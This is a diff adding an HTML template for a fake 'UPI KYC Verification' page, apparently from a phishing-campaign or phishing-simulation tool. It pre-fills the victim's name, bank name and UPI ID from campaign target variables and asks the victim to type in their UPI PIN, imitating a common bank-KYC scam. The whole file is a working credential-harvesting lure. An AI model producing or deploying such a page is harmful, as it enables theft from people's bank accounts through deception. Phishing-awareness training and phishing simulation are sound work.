@@ -1,0 +1,27 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>KYC Verification</title></head>
+<body>
+<h2>UPI KYC Verification</h2>
+<p>To continue using UPI services, please verify your details.</p>
+<form method="post">
+  <div>
+    <label>Name</label>
+    <input type="text" name="name" value="{{ ct.target.name }}">
+  </div>
+  <div>
+    <label>Bank name</label>
+    <input type="text" name="bank_name" value="{{ ct.target.bank_name }}">
+  </div>
+  <div>
+    <label>UPI ID</label>
+    <input type="text" name="upi_id" value="{{ ct.target.upi_id }}">
+  </div>
+  <div>
+    <label>UPI PIN</label>
+    <input type="password" name="upi_pin">
+  </div>
+  <button type="submit">Verify</button>
+</form>
+</body>
+</html>
